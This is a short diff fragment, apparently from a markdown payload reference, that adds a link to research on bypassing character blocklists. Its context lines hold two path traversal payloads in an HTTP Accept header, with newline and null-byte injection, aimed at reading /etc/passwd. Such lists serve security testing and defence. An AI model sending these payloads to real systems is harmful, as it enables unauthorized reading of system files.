@@ -15,3 +15,4 @@ Accept: ../../../../.././../../../../etc/passwd{%0A{{
 
 Accept: ../../../../.././../../../../etc/passwd{%00{{
 ```
+- https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows
